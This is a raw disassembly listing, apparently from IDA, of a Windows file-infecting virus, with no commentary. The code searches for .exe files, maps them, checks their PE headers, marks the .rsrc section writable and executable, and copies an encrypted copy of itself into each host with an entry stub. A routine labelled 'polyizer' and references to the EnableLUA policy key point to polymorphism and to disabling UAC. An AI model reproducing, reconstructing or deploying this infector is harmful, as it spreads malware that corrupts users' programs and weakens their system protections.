.text:004018B1                 cmp     dword ptr [edi], 0FFh
.text:004018B7                 jz      short locret_4018BB
.text:004018B9                 jmp     short sub_40188E
.text:004018BB ; ---------------------------------------------------------------------------
.text:004018BB
.text:004018BB locret_4018BB:                          ; CODE XREF: sub_40188E+29\u2191j
.text:004018BB                 retn
.text:004018BB sub_40188E      endp ; sp-analysis failed
.text:004018BB
.text:004018BB ; ---------------------------------------------------------------------------
.text:004018BC dword_4018BC    dd 4E850h               ; DATA XREF: sub_401B3B+3B\u2193o
.text:004018C0                 db 2 dup(0)
.text:004018C2 dword_4018C2    dd 0FFh                 ; DATA XREF: start+304\u2191w
.text:004018C2                                         ; sub_401A07+5\u2193r ...
.text:004018C6
.text:004018C6 ; =============== S U B R O U T I N E =======================================
.text:004018C6
.text:004018C6
.text:004018C6 sub_4018C6      proc near
.text:004018C6                 nop
.text:004018C7
.text:004018C7 loc_4018C7:                             ; DATA XREF: polyizer+14\u2193o
.text:004018C7                                         ; .text:00402644\u2193o
.text:004018C7                 nop
.text:004018C8                 nop
.text:004018C9                 nop
.text:004018CA                 nop
.text:004018CB                 nop
.text:004018CC                 nop
.text:004018CD                 nop
.text:004018CE                 nop
.text:004018CF                 nop
.text:004018D0                 nop
.text:004018D1                 nop
.text:004018D2                 nop
.text:004018D3                 nop
.text:004018D4                 nop
.text:004018D5                 nop
.text:004018D6                 nop
.text:004018D7                 nop
.text:004018D8                 nop
.text:004018D9                 nop
.text:004018DA                 nop
.text:004018DB                 nop
.text:004018DC                 nop
.text:004018DD                 nop
.text:004018DE                 nop
.text:004018DF                 nop
.text:004018E0                 nop
.text:004018E1                 nop
.text:004018E2                 nop
.text:004018E3                 nop
.text:004018E4                 nop
.text:004018E5                 nop
.text:004018E6                 nop
.text:004018E7                 nop
.text:004018E8                 nop
.text:004018E9                 nop
.text:004018EA                 nop
.text:004018EB                 nop
.text:004018EC                 nop
.text:004018ED                 nop
.text:004018EE                 nop
.text:004018EF                 nop
.text:004018F0                 nop
.text:004018F1                 nop
.text:004018F2                 nop
.text:004018F3                 nop
.text:004018F4                 nop
.text:004018F5                 nop
.text:004018F6                 nop
.text:004018F7                 nop
.text:004018F8                 nop
.text:004018F9                 nop
.text:004018FA                 nop
.text:004018FB                 nop
.text:004018FC                 nop
.text:004018FD                 nop
.text:004018FE                 nop
.text:004018FF                 nop
.text:00401900                 nop
.text:00401901                 nop
.text:00401902                 nop
.text:00401903                 nop
.text:00401904                 nop
.text:00401905                 nop
.text:00401906                 nop
.text:00401907                 nop
.text:00401908                 nop
.text:00401909                 nop
.text:0040190A                 nop
.text:0040190B                 nop
.text:0040190C                 nop
.text:0040190D                 nop
.text:0040190E                 nop
.text:0040190F                 nop
.text:00401910                 nop
.text:00401911                 nop
.text:00401912                 nop
.text:00401913                 nop
.text:00401914                 nop
.text:00401915                 nop
.text:00401916                 nop
.text:00401917                 nop
.text:00401918                 nop
.text:00401919                 nop
.text:0040191A                 nop
.text:0040191B                 nop
.text:0040191C                 nop
.text:0040191D                 nop
.text:0040191E                 nop
.text:0040191F                 nop
.text:00401920                 nop
.text:00401921                 nop
.text:00401922                 nop
.text:00401923                 nop
.text:00401924                 nop
.text:00401925                 nop
.text:00401926                 nop
.text:00401927                 nop
.text:00401928                 nop
.text:00401929                 nop
.text:0040192A                 nop
.text:0040192B                 nop
.text:0040192C                 nop
.text:0040192D                 nop
.text:0040192E                 nop
.text:0040192F                 nop
.text:00401930                 nop
.text:00401931                 nop
.text:00401932                 nop
.text:00401933                 nop
.text:00401934                 nop
.text:00401935                 nop
.text:00401936                 nop
.text:00401937                 nop
.text:00401938                 nop
.text:00401939                 nop
.text:0040193A                 nop
.text:0040193B                 nop
.text:0040193C                 nop
.text:0040193D                 nop
.text:0040193E                 nop
.text:0040193F                 nop
.text:00401940                 nop
.text:00401941                 nop
.text:00401942                 nop
.text:00401943                 nop
.text:00401944                 nop
.text:00401945                 nop
.text:00401946                 nop
.text:00401947                 nop
.text:00401948                 nop
.text:00401949                 nop
.text:0040194A                 nop
.text:0040194B                 nop
.text:0040194C                 nop
.text:0040194D                 nop
.text:0040194E                 nop
.text:0040194F                 nop
.text:00401950                 nop
.text:00401951                 nop
.text:00401952                 nop
.text:00401953                 nop
.text:00401954                 nop
.text:00401955                 nop
.text:00401956                 nop
.text:00401957                 nop
.text:00401958                 nop
.text:00401959                 nop
.text:0040195A                 nop
.text:0040195B                 nop
.text:0040195C                 nop
.text:0040195D                 nop
.text:0040195E                 nop
.text:0040195F                 nop
.text:00401960                 nop
.text:00401961                 nop
.text:00401962                 nop
.text:00401963                 nop
.text:00401964                 nop
.text:00401965                 nop
.text:00401966                 nop
.text:00401967                 nop
.text:00401968                 nop
.text:00401969                 nop
.text:0040196A                 nop
.text:0040196B                 nop
.text:0040196C                 nop
.text:0040196D                 nop
.text:0040196E                 nop
.text:0040196F                 nop
.text:00401970                 nop
.text:00401971                 nop
.text:00401972                 nop
.text:00401973                 nop
.text:00401974                 nop
.text:00401975                 nop
.text:00401976                 nop
.text:00401977                 nop
.text:00401978                 nop
.text:00401979                 nop
.text:0040197A                 nop
.text:0040197B                 nop
.text:0040197C                 nop
.text:0040197D                 nop
.text:0040197E                 nop
.text:0040197F                 nop
.text:00401980                 nop
.text:00401981                 nop
.text:00401982                 nop
.text:00401983                 nop
.text:00401984                 nop
.text:00401985                 nop
.text:00401986                 nop
.text:00401987                 nop
.text:00401988                 nop
.text:00401989                 nop
.text:0040198A                 nop
.text:0040198B                 nop
.text:0040198C                 nop
.text:0040198D                 nop
.text:0040198E                 nop
.text:0040198F                 nop
.text:00401990                 nop
.text:00401991                 nop
.text:00401992                 nop
.text:00401993                 nop
.text:00401994                 nop
.text:00401995                 nop
.text:00401996                 nop
.text:00401997                 nop
.text:00401998                 nop
.text:00401999                 nop
.text:0040199A                 nop
.text:0040199B                 nop
.text:0040199C                 nop
.text:0040199D                 nop
.text:0040199E                 nop
.text:0040199F                 nop
.text:004019A0                 nop
.text:004019A1                 nop
.text:004019A2                 nop
.text:004019A3                 nop
.text:004019A4                 nop
.text:004019A5                 nop
.text:004019A6                 nop
.text:004019A7                 nop
.text:004019A8                 nop
.text:004019A9                 nop
.text:004019AA                 nop
.text:004019AB                 nop
.text:004019AC                 nop
.text:004019AD                 nop
.text:004019AE                 nop
.text:004019AF                 nop
.text:004019B0                 nop
.text:004019B1                 nop
.text:004019B2                 nop
.text:004019B3                 nop
.text:004019B4                 nop
.text:004019B5                 nop
.text:004019B6                 nop
.text:004019B7                 nop
.text:004019B8                 nop
.text:004019B9                 nop
.text:004019BA                 nop
.text:004019BB                 nop
.text:004019BC                 nop
.text:004019BD                 nop
.text:004019BE                 nop
.text:004019BF                 nop
.text:004019C0                 nop
.text:004019C1                 nop
.text:004019C2                 nop
.text:004019C3                 nop
.text:004019C4                 nop
.text:004019C5                 nop
.text:004019C6                 nop
.text:004019C7                 nop
.text:004019C8                 nop
.text:004019C9                 nop
.text:004019CA                 nop
.text:004019CB                 nop
.text:004019CC                 nop
.text:004019CD                 nop
.text:004019CE                 nop
.text:004019CF                 nop
.text:004019D0                 nop
.text:004019D1                 nop
.text:004019D2                 nop
.text:004019D3                 nop
.text:004019D4                 nop
.text:004019D5                 nop
.text:004019D6                 nop
.text:004019D7                 nop
.text:004019D8                 nop
.text:004019D9                 nop
.text:004019DA                 nop
.text:004019DB                 nop
.text:004019DC                 nop
.text:004019DD                 nop
.text:004019DE                 nop
.text:004019DF                 nop
.text:004019E0                 nop
.text:004019E1                 nop
.text:004019E2                 nop
.text:004019E3                 nop
.text:004019E4                 nop
.text:004019E5                 nop
.text:004019E6                 nop
.text:004019E7                 nop
.text:004019E8                 nop
.text:004019E9                 nop
.text:004019EA                 nop
.text:004019EB                 nop
.text:004019EC                 nop
.text:004019ED                 nop
.text:004019EE                 nop
.text:004019EF                 nop
.text:004019F0                 nop
.text:004019F1                 nop
.text:004019F2                 nop
.text:004019F3                 nop
.text:004019F4                 nop
.text:004019F5                 nop
.text:004019F6                 nop
.text:004019F7                 nop
.text:004019F8                 nop
.text:004019F9                 nop
.text:004019FA                 nop
.text:004019FB                 nop
.text:004019FC                 nop
.text:004019FD                 nop
.text:004019FE                 nop
.text:004019FF                 nop
.text:00401A00                 nop
.text:00401A01                 nop
.text:00401A02                 nop
.text:00401A03                 nop
.text:00401A04                 nop
.text:00401A05                 nop
.text:00401A06                 nop
.text:00401A06 sub_4018C6      endp
.text:00401A06
.text:00401A07
.text:00401A07 ; =============== S U B R O U T I N E =======================================
.text:00401A07
.text:00401A07
.text:00401A07 sub_401A07      proc near               ; CODE XREF: sub_401B8C+27D\u2193p
.text:00401A07                 mov     ecx, 1720h
.text:00401A0C                 mov     eax, ss:dword_4018C2[ebp]
.text:00401A12
.text:00401A12 loc_401A12:                             ; CODE XREF: sub_401A07+E\u2193j
.text:00401A12                 xor     [esi], eax
.text:00401A14                 inc     esi
.text:00401A15                 loop    loc_401A12
.text:00401A17                 retn
.text:00401A17 sub_401A07      endp
.text:00401A17
.text:00401A18 ; ---------------------------------------------------------------------------
.text:00401A18                 jmp     short sub_401A5A
.text:00401A18 ; ---------------------------------------------------------------------------
.text:00401A1A dword_401A1A    dd 0                    ; DATA XREF: sub_401B8C\u2193w
.text:00401A1A                                         ; sub_401B8C+6\u2193r ...
.text:00401A1E dword_401A1E    dd 0                    ; DATA XREF: start+2BA\u2191r
.text:00401A1E                                         ; sub_401B8C+6D\u2193w
.text:00401A22 dword_401A22    dd 0                    ; DATA XREF: start+2B4\u2191r
.text:00401A22                                         ; sub_401B15+2\u2193r ...
.text:00401A26 dword_401A26    dd 0                    ; DATA XREF: sub_401B8C+242\u2193w
.text:00401A26                                         ; sub_401B8C+296\u2193r
.text:00401A2A dword_401A2A    dd 0                    ; DATA XREF: sub_401B8C+1AA\u2193w
.text:00401A2A                                         ; sub_401B8C+1F4\u2193r ...
.text:00401A2E dword_401A2E    dd 0                    ; DATA XREF: sub_401B3B+10\u2193r
.text:00401A2E                                         ; sub_401B8C+F5\u2193w ...
.text:00401A32 dword_401A32    dd 0                    ; DATA XREF: sub_401B8C+1C1\u2193w
.text:00401A32                                         ; sub_401B8C+1E8\u2193r ...
.text:00401A36 dword_401A36    dd 0                    ; DATA XREF: sub_401B8C+1A\u2193w
.text:00401A36                                         ; sub_401B8C+27\u2193r ...
.text:00401A3A dword_401A3A    dd 0                    ; DATA XREF: sub_401A5A+16\u2193w
.text:00401A3A                                         ; sub_401A5A+1C\u2193r ...
.text:00401A3E word_401A3E     dw 2E2Ah                ; DATA XREF: sub_401A5A+22\u2193o
.text:00401A40                 db 2Ah, 0
.text:00401A42 dword_401A42    dd 0                    ; DATA XREF: sub_401A5A+39\u2193w
.text:00401A42                                         ; sub_401A5A+6D\u2193r ...
.text:00401A46                 align 4
.text:00401A48                 dd 2E2A0000h, 2Ah, 0
.text:00401A54                 db 2 dup(0)
.text:00401A56 dword_401A56    dd 0                    ; DATA XREF: sub_401B3B+2C\u2193r
.text:00401A56                                         ; sub_401B8C+290\u2193w
.text:00401A5A
.text:00401A5A ; =============== S U B R O U T I N E =======================================
.text:00401A5A
.text:00401A5A
.text:00401A5A sub_401A5A      proc near               ; CODE XREF: start+30A\u2191p
.text:00401A5A                                         ; .text:00401A18\u2191j ...
.text:00401A5A                 mov     eax, 13Eh
.text:00401A5F                 push    eax
.text:00401A60                 push    0
.text:00401A62                 call    ss:dword_401753[ebp]
.text:00401A68                 or      eax, eax
.text:00401A6A                 jz      locret_401B14
.text:00401A70                 mov     ss:dword_401A3A[ebp], eax
.text:00401A76                 push    ss:dword_401A3A[ebp]
.text:00401A7C                 mov     eax, offset word_401A3E
.text:00401A81                 add     eax, ebp
.text:00401A83                 push    eax
.text:00401A84                 call    ss:dword_401767[ebp]
.text:00401A8A                 cmp     eax, 0FFFFFFFFh
.text:00401A8D                 jz      locret_401B14
.text:00401A93                 mov     ss:dword_401A42[ebp], eax
.text:00401A99                 mov     eax, ss:dword_401A3A[ebp]
.text:00401A9F                 add     eax, 2Ch ; ','
.text:00401AA2                 mov     esi, eax
.text:00401AA4                 call    sub_40243A
.text:00401AA9                 mov     esi, eax
.text:00401AAB                 add     esi, ecx
.text:00401AAD                 sub     esi, 4
.text:00401AB0                 mov     edx, [esi]
.text:00401AB2                 xor     edx, 6578652Eh
.text:00401AB8                 or      edx, edx
.text:00401ABA                 jnz     short loc_401AC1
.text:00401ABC                 call    sub_401B8C
.text:00401AC1
.text:00401AC1 loc_401AC1:                             ; CODE XREF: sub_401A5A+60\u2191j
.text:00401AC1                                         ; sub_401A5A+A5\u2193j ...
.text:00401AC1                 push    ss:dword_401A3A[ebp]
.text:00401AC7                 push    ss:dword_401A42[ebp]
.text:00401ACD                 call    ss:dword_40176B[ebp]
.text:00401AD3                 call    ss:dword_401773[ebp]
.text:00401AD9                 cmp     eax, 12h
.text:00401ADC                 jz      short loc_401B08
.text:00401ADE                 mov     eax, ss:dword_401A3A[ebp]
.text:00401AE4                 add     eax, 2Ch ; ','
.text:00401AE7                 mov     esi, eax
.text:00401AE9                 call    sub_40243A
.text:00401AEE                 mov     esi, eax
.text:00401AF0                 add     esi, ecx
.text:00401AF2                 sub     esi, 4
.text:00401AF5                 mov     edx, [esi]
.text:00401AF7                 xor     edx, 6578652Eh
.text:00401AFD                 or      edx, edx
.text:00401AFF                 jnz     short loc_401AC1
.text:00401B01                 call    sub_401B8C
.text:00401B06                 jmp     short loc_401AC1
.text:00401B08 ; ---------------------------------------------------------------------------
.text:00401B08
.text:00401B08 loc_401B08:                             ; CODE XREF: sub_401A5A+82\u2191j
.text:00401B08                 push    ss:dword_401A42[ebp]
.text:00401B0E                 call    ss:dword_40176F[ebp]
.text:00401B14
.text:00401B14 locret_401B14:                          ; CODE XREF: sub_401A5A+10\u2191j
.text:00401B14                                         ; sub_401A5A+33\u2191j
.text:00401B14                 retn
.text:00401B14 sub_401A5A      endp
.text:00401B14
.text:00401B15
.text:00401B15 ; =============== S U B R O U T I N E =======================================
.text:00401B15
.text:00401B15
.text:00401B15 sub_401B15      proc near               ; CODE XREF: sub_401B8C+23D\u2193p
.text:00401B15                 push    ebx
.text:00401B16                 push    edx
.text:00401B17                 mov     ebx, ss:dword_401A22[ebp]
.text:00401B1D
.text:00401B1D loc_401B1D:                             ; CODE XREF: sub_401B15+14\u2193j
.text:00401B1D                                         ; sub_401B15+20\u2193j
.text:00401B1D                 xor     eax, eax
.text:00401B1F                 mov     eax, [edx+0Ch]
.text:00401B22                 cmp     eax, ebx
.text:00401B24                 jle     short loc_401B2B
.text:00401B26                 add     edx, 28h ; '('
.text:00401B29                 jmp     short loc_401B1D
.text:00401B2B ; ---------------------------------------------------------------------------
.text:00401B2B
.text:00401B2B loc_401B2B:                             ; CODE XREF: sub_401B15+F\u2191j
.text:00401B2B                 add     eax, [edx+10h]
.text:00401B2E                 cmp     eax, ebx
.text:00401B30                 jg      short loc_401B37
.text:00401B32                 add     edx, 28h ; '('
.text:00401B35                 jmp     short loc_401B1D
.text:00401B37 ; ---------------------------------------------------------------------------
.text:00401B37
.text:00401B37 loc_401B37:                             ; CODE XREF: sub_401B15+1B\u2191j
.text:00401B37                 xchg    eax, edx
.text:00401B38                 pop     edx
.text:00401B39                 pop     ebx
.text:00401B3A                 retn
.text:00401B3A sub_401B15      endp
.text:00401B3A
.text:00401B3B
.text:00401B3B ; =============== S U B R O U T I N E =======================================
.text:00401B3B
.text:00401B3B
.text:00401B3B sub_401B3B      proc near               ; CODE XREF: sub_401B8C+29C\u2193p
.text:00401B3B
.text:00401B3B var_4           = dword ptr -4
.text:00401B3B
.text:00401B3B                 mov     dword ptr [eax+24h], 0C0000040h
.text:00401B42                 mov     edx, ss:dword_401A22[ebp]
.text:00401B48                 sub     edx, [eax+0Ch]
.text:00401B4B                 mov     ecx, ss:dword_401A2E[ebp]
.text:00401B51                 add     ecx, [eax+14h]
.text:00401B54                 add     ecx, edx
.text:00401B56                 lea     edi, byte_401077[ebp]
.text:00401B5C                 xchg    esi, ecx
.text:00401B5E                 mov     ecx, ss:dword_4018C2[ebp]
.text:00401B64                 mov     byte ptr [esi], 0B8h ; ''
.text:00401B67                 push    ss:dword_401A56[ebp]
.text:00401B6D                 xor     [esp+4+var_4], ecx
.text:00401B70                 pop     dword ptr [esi+1]
.text:00401B73                 add     esi, 5
.text:00401B76                 lea     edi, dword_4018BC[ebp]
.text:00401B7C                 xchg    edi, esi
.text:00401B7E                 mov     ecx, 14Bh
.text:00401B83                 rep movsb
.text:00401B85                 retn
.text:00401B85 sub_401B3B      endp
.text:00401B85
.text:00401B86 ; ---------------------------------------------------------------------------
.text:00401B86 ; START OF FUNCTION CHUNK FOR sub_401B8C
.text:00401B86
.text:00401B86 loc_401B86:                             ; CODE XREF: sub_401B8C+AA\u2193j
.text:00401B86                                         ; sub_401B8C+C4\u2193j ...
.text:00401B86                 popa
.text:00401B87                 jmp     locret_401E62
.text:00401B87 ; END OF FUNCTION CHUNK FOR sub_401B8C
.text:00401B8C
.text:00401B8C ; =============== S U B R O U T I N E =======================================
.text:00401B8C
.text:00401B8C
.text:00401B8C sub_401B8C      proc near               ; CODE XREF: start+2F4\u2191p
.text:00401B8C                                         ; sub_401A5A+62\u2191p ...
.text:00401B8C
.text:00401B8C ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:00401B8C ; FUNCTION CHUNK AT .text:00401B86 SIZE 00000006 BYTES
.text:00401B8C
.text:00401B8C                 mov     ss:dword_401A1A[ebp], eax
.text:00401B92                 push    ss:dword_401A1A[ebp]
.text:00401B98                 call    ss:dword_40177B[ebp]
.text:00401B9E                 or      eax, eax
.text:00401BA0                 jz      locret_401E62
.text:00401BA6                 mov     ss:dword_401A36[ebp], eax
.text:00401BAC                 push    0Ah
.text:00401BAE                 push    4D2h
.text:00401BB3                 push    ss:dword_401A36[ebp]
.text:00401BB9                 call    ss:dword_40174B[ebp]
.text:00401BBF                 or      eax, eax
.text:00401BC1                 jnz     locret_401E62
.text:00401BC7                 mov     esi, ss:dword_401A36[ebp]
.text:00401BCD                 cmp     word ptr [esi], 5A4Dh
.text:00401BD2                 jnz     locret_401E62
.text:00401BD8                 add     esi, [esi+3Ch]
.text:00401BDB                 cmp     word ptr [esi], 4550h
.text:00401BE0                 jnz     locret_401E62
.text:00401BE6                 cmp     dword ptr [esi+88h], 0
.text:00401BED                 jz      locret_401E62
.text:00401BF3                 mov     eax, [esi+28h]
.text:00401BF6                 mov     ebx, [esi+34h]
.text:00401BF9                 mov     ss:dword_401A1E[ebp], ebx
.text:00401BFF                 mov     ss:dword_401A22[ebp], eax
.text:00401C05                 push    edi
.text:00401C06                 mov     edi, eax
.text:00401C08                 add     edi, ss:dword_401A36[ebp]
.text:00401C0E                 push    esi
.text:00401C0F                 lea     esi, byte_401077[ebp]
.text:00401C15                 xchg    esi, edi
.text:00401C17                 mov     ecx, 200h
.text:00401C1C                 rep movsb
.text:00401C1E                 pop     esi
.text:00401C1F                 pop     edi
.text:00401C20                 xor     ecx, ecx
.text:00401C22                 xor     edx, edx
.text:00401C24                 mov     cx, [esi+6]
.text:00401C28                 mov     dx, [esi+14h]
.text:00401C2C                 add     esi, 18h
.text:00401C2F                 add     esi, edx
.text:00401C31                 pusha
.text:00401C32
.text:00401C32 loc_401C32:                             ; CODE XREF: sub_401B8C+B3\u2193j
.text:00401C32                 cmp     dword ptr [esi+10h], 0
.text:00401C36                 jz      loc_401B86
.text:00401C3C                 add     esi, 28h ; '('
.text:00401C3F                 loop    loc_401C32
.text:00401C41                 popa
.text:00401C42                 pusha
.text:00401C43
.text:00401C43 loc_401C43:                             ; CODE XREF: sub_401B8C+C2\u2193j
.text:00401C43                 cmp     dword ptr [esi], 7273722Eh
.text:00401C49                 jz      short loc_401C55
.text:00401C4B                 add     esi, 28h ; '('
.text:00401C4E                 loop    loc_401C43
.text:00401C50                 jmp     loc_401B86
.text:00401C55 ; ---------------------------------------------------------------------------
.text:00401C55
.text:00401C55 loc_401C55:                             ; CODE XREF: sub_401B8C+BD\u2191j
.text:00401C55                 dec     ecx
.text:00401C56                 or      ecx, ecx
.text:00401C58                 jz      short loc_401C5F
.text:00401C5A                 jmp     loc_401B86
.text:00401C5F ; ---------------------------------------------------------------------------
.text:00401C5F
.text:00401C5F loc_401C5F:                             ; CODE XREF: sub_401B8C+CC\u2191j
.text:00401C5F                 popa
.text:00401C60                 push    ss:dword_401A36[ebp]
.text:00401C66                 call    ss:dword_40177F[ebp]
.text:00401C6C                 push    1720h
.text:00401C71                 push    0
.text:00401C73                 call    ss:dword_401753[ebp]
.text:00401C79                 or      eax, eax
.text:00401C7B                 jz      locret_401E62
.text:00401C81                 mov     ss:dword_401A2E[ebp], eax
.text:00401C87                 mov     esi, offset start
.text:00401C8C                 add     esi, ebp
.text:00401C8E                 mov     edi, ss:dword_401A2E[ebp]
.text:00401C94                 mov     ecx, 1720h
.text:00401C99                 rep movsb
.text:00401C9B                 mov     ecx, 1720h
.text:00401CA0                 sub     ecx, 72h ; 'r'
.text:00401CA6                 mov     eax, ss:dword_401A2E[ebp]
.text:00401CAC                 add     eax, 72h ; 'r'
.text:00401CB1
.text:00401CB1 loc_401CB1:                             ; CODE XREF: sub_401B8C+13A\u2193j
.text:00401CB1                 push    ecx
.text:00401CB2                 mov     cx, [eax]
.text:00401CB5                 xchg    ch, cl
.text:00401CB7                 rol     ch, cl
.text:00401CB9                 mov     [eax], cx
.text:00401CBC                 add     eax, 2
.text:00401CBF                 pop     ecx
.text:00401CC0                 sub     ecx, 2
.text:00401CC3                 cmp     ecx, 0
.text:00401CC6                 ja      short loc_401CB1
.text:00401CC8                 push    0
.text:00401CCA                 push    ss:dword_401A1A[ebp]
.text:00401CD0                 call    ss:dword_40173F[ebp]
.text:00401CD6                 or      eax, eax
.text:00401CD8                 jz      locret_401E62
.text:00401CDE                 push    eax
.text:00401CDF                 push    1720h
.text:00401CE4                 push    ss:dword_401A2E[ebp]
.text:00401CEA                 push    9
.text:00401CEC                 push    4D2h
.text:00401CF1                 push    0Ah
.text:00401CF3                 push    eax
.text:00401CF4                 call    ss:dword_401743[ebp]
.text:00401CFA                 or      eax, eax
.text:00401CFC                 jz      locret_401E62
.text:00401D02                 pop     eax
.text:00401D03                 push    0
.text:00401D05                 push    eax
.text:00401D06                 call    ss:dword_401747[ebp]
.text:00401D0C                 or      eax, eax
.text:00401D0E                 jz      locret_401E62
.text:00401D14                 xor     eax, eax
.text:00401D16                 push    eax
.text:00401D17                 push    eax
.text:00401D18                 push    3
.text:00401D1A                 push    eax
.text:00401D1B                 push    2
.text:00401D1D                 push    0C0000000h
.text:00401D22                 push    ss:dword_401A1A[ebp]
.text:00401D28                 call    ss:dword_40172F[ebp]
.text:00401D2E                 or      eax, eax
.text:00401D30                 jz      loc_40138D
.text:00401D36                 mov     ss:dword_401A2A[ebp], eax
.text:00401D3C                 push    0
.text:00401D3E                 push    eax
.text:00401D3F                 call    ss:dword_40174F[ebp]
.text:00401D45                 or      eax, eax
.text:00401D47                 jz      locret_401E62
.text:00401D4D                 mov     ss:dword_401A32[ebp], eax
.text:00401D53                 push    eax
.text:00401D54                 push    0
.text:00401D56                 call    ss:dword_401753[ebp]
.text:00401D5C                 or      eax, eax
.text:00401D5E                 jz      locret_401E62
.text:00401D64                 mov     ss:dword_401A2E[ebp], eax
.text:00401D6A                 push    0
.text:00401D6C                 mov     eax, offset dword_401A36
.text:00401D71                 add     eax, ebp
.text:00401D73                 push    eax
.text:00401D74                 push    ss:dword_401A32[ebp]
.text:00401D7A                 push    ss:dword_401A2E[ebp]
.text:00401D80                 push    ss:dword_401A2A[ebp]
.text:00401D86                 call    ss:dword_40173B[ebp]
.text:00401D8C                 or      eax, eax
.text:00401D8E                 jz      locret_401E62
.text:00401D94                 mov     esi, ss:dword_401A2E[ebp]
.text:00401D9A                 cmp     word ptr [esi], 5A4Dh
.text:00401D9F                 jnz     locret_401E62
.text:00401DA5                 add     esi, [esi+3Ch]
.text:00401DA8                 cmp     word ptr [esi], 4550h
.text:00401DAD                 jnz     locret_401E62
.text:00401DB3                 push    esi
.text:00401DB4                 xor     ecx, ecx
.text:00401DB6                 xor     ebx, ebx
.text:00401DB8                 mov     bx, [esi+14h]
.text:00401DBC                 mov     cx, [esi+6]
.text:00401DC0                 add     esi, 18h
.text:00401DC3                 add     esi, ebx
.text:00401DC5                 mov     edx, esi
.text:00401DC7                 push    esi
.text:00401DC8                 push    ecx
.text:00401DC9                 call    sub_401B15
.text:00401DCE                 mov     ss:dword_401A26[ebp], eax
.text:00401DD4                 pop     ecx
.text:00401DD5                 pop     esi
.text:00401DD6                 xor     ebx, ebx
.text:00401DD8
.text:00401DD8 loc_401DD8:                             ; CODE XREF: sub_401B8C+257\u2193j
.text:00401DD8                 cmp     dword ptr [esi], 7273722Eh
.text:00401DDE                 jz      short loc_401DE7
.text:00401DE0                 add     esi, 28h ; '('
.text:00401DE3                 loop    loc_401DD8
.text:00401DE5                 jmp     short locret_401E62
.text:00401DE7 ; ---------------------------------------------------------------------------
.text:00401DE7
.text:00401DE7 loc_401DE7:                             ; CODE XREF: sub_401B8C+252\u2191j
.text:00401DE7                 mov     dword ptr [esi+24h], 0C0000040h
.text:00401DEE                 mov     ecx, [esi+10h]
.text:00401DF1                 mov     esi, [esi+14h]
.text:00401DF4                 add     esi, ss:dword_401A2E[ebp]
.text:00401DFA                 push    ecx
.text:00401DFB
.text:00401DFB loc_401DFB:                             ; CODE XREF: sub_401B8C+27A\u2193j
.text:00401DFB                 mov     edx, dword ptr ss:start[ebp]
.text:00401E01                 cmp     [esi], edx
.text:00401E03                 jz      short loc_401E08
.text:00401E05                 inc     esi
.text:00401E06                 loop    loc_401DFB
.text:00401E08
.text:00401E08 loc_401E08:                             ; CODE XREF: sub_401B8C+277\u2191j
.text:00401E08                 pusha
.text:00401E09                 call    sub_401A07
.text:00401E0E                 popa
.text:00401E0F                 pop     edx
.text:00401E10                 sub     edx, ecx
.text:00401E12                 pop     edi
.text:00401E13                 add     edx, [edi+88h]
.text:00401E19                 add     edx, [edi+34h]
.text:00401E1C                 mov     ss:dword_401A56[ebp], edx
.text:00401E22                 mov     eax, ss:dword_401A26[ebp]
.text:00401E28                 call    sub_401B3B
.text:00401E2D                 push    0
.text:00401E2F                 push    0
.text:00401E31                 push    0
.text:00401E33                 push    ss:dword_401A2A[ebp]
.text:00401E39                 call    ss:dword_401757[ebp]
.text:00401E3F                 push    0
.text:00401E41                 mov     eax, offset dword_401A36
.text:00401E46                 add     eax, ebp
.text:00401E48                 push    eax
.text:00401E49                 push    ss:dword_401A32[ebp]
.text:00401E4F                 push    ss:dword_401A2E[ebp]
.text:00401E55                 push    ss:dword_401A2A[ebp]
.text:00401E5B                 call    ss:dword_401737[ebp]
.text:00401E61                 retn
.text:00401E62 ; ---------------------------------------------------------------------------
.text:00401E62
.text:00401E62 locret_401E62:                          ; CODE XREF: sub_401B8C-5\u2191j
.text:00401E62                                         ; sub_401B8C+14\u2191j ...
.text:00401E62                 retn
.text:00401E62 sub_401B8C      endp ; sp-analysis failed
.text:00401E62
.text:00401E62 ; ---------------------------------------------------------------------------
.text:00401E63 aYouNeedAdminis db 'You need Administrator Privilege to run this Application',0
.text:00401E63                                         ; DATA XREF: sub_401EB4+A\u2193o
.text:00401E9C aError          db 'Error',0            ; DATA XREF: sub_401EB4+10\u2193o
.text:00401EA2 aInitializesrwl db 'InitializeSRWLock',0
.text:00401EA2                                         ; DATA XREF: sub_401EB4:loc_401ED7\u2193o
.text:00401EB4
.text:00401EB4 ; =============== S U B R O U T I N E =======================================
.text:00401EB4
.text:00401EB4
.text:00401EB4 sub_401EB4      proc near               ; CODE XREF: start:loc_401332\u2191p
.text:00401EB4                 call    ss:dword_40180B[ebp]
.text:00401EBA                 or      eax, eax
.text:00401EBC                 jnz     short loc_401ED7
.text:00401EBE                 lea     eax, aYouNeedAdminis[ebp] ; "You need Administrator Privilege to run"...
.text:00401EC4                 lea     edx, aError[ebp] ; "Error"
.text:00401ECA                 push    10h
.text:00401ECC                 push    edx
.text:00401ECD                 push    eax
.text:00401ECE                 push    0
.text:00401ED0                 call    ss:dword_4013CD[ebp]
.text:00401ED6                 retn
.text:00401ED7 ; ---------------------------------------------------------------------------
.text:00401ED7
.text:00401ED7 loc_401ED7:                             ; CODE XREF: sub_401EB4+8\u2191j
.text:00401ED7                 lea     eax, aInitializesrwl[ebp] ; "InitializeSRWLock"
.text:00401EDD                 push    eax
.text:00401EDE                 push    ss:dword_4013EA[ebp]
.text:00401EE4                 call    ss:dword_401449[ebp]
.text:00401EEA                 or      eax, eax
.text:00401EEC                 jz      short locret_401EF4
.text:00401EEE                 call    sub_401F45
.text:00401EF3                 retn
.text:00401EF4 ; ---------------------------------------------------------------------------
.text:00401EF4
.text:00401EF4 locret_401EF4:                          ; CODE XREF: sub_401EB4+38\u2191j
.text:00401EF4                 retn
.text:00401EF4 sub_401EB4      endp ; sp-analysis failed
.text:00401EF4
.text:00401EF4 ; ---------------------------------------------------------------------------
.text:00401EF5 aSoftwareMicros db 'Software\Microsoft\Windows\CurrentVersion\Policies\System',0
.text:00401EF5                                         ; DATA XREF: sub_401F45+B\u2193o
.text:00401F2F aEnablelua      db 'EnableLUA',0        ; DATA XREF: sub_401F45+37\u2193o
.text:00401F39 dword_401F39    dd 4                    ; DATA XREF: sub_401F45+26\u2193r
.text:00401F3D byte_401F3D     db 3 dup(0)             ; DATA XREF: sub_401F45+2C\u2193o
.text:00401F40                 db 0
.text:00401F41 dword_401F41    dd 0                    ; DATA XREF: sub_401F45\u2193o
